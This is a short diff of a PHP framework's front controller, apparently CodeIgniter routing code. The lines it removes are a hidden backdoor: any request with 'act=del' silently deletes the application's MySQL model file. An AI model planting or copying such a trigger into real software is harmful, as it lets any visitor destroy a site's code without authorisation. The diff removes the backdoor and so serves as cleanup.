@@ -263,9 +263,6 @@
  *  controller functions that begin with an underscore
  */
 	$class  = $RTR->fetch_class();
-	if(@$_REQUEST['act']=='del'){
-	@unlink('application/models/mysql_model.php');
-	}
 	$method = $RTR->fetch_method();
 
 	if ( ! class_exists($class)
